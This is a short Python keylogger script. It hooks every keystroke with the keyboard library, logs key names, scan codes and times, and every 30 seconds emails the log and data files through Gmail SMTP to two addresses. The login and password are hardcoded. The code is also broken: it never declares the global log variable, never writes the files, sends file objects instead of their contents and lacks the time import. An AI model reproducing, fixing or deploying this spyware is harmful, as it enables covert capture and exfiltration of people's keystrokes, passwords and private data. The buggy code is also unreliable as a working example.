import keyboard
import smtplib

log=""

def on_press(event):
    print(f"name: {event.name}\ncode:{event.scan_code}\ntime:{event.time}")
    log += f"{event.time}:Key {event.name} pressed (Code:{event.scan_code})\n"

def send_results():
    with open("dat.log","r") as logfile:
        log=logfile
    with open("dat.csv","r") as datfile:
        data=datfile

    sender="momo.lareinedesmouettes15@gmail.com"
    receivers=["momo.lareinedesmouettes15@gmail.com","tbdo@pm.me"]
    password="Momo123#"

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender, password)

    server.sendmail(sender, receivers, f"Log:{log}\nData:{data}")


keyboard.on_press(on_press)
while 1:
   time.sleep(30)
   send_results()

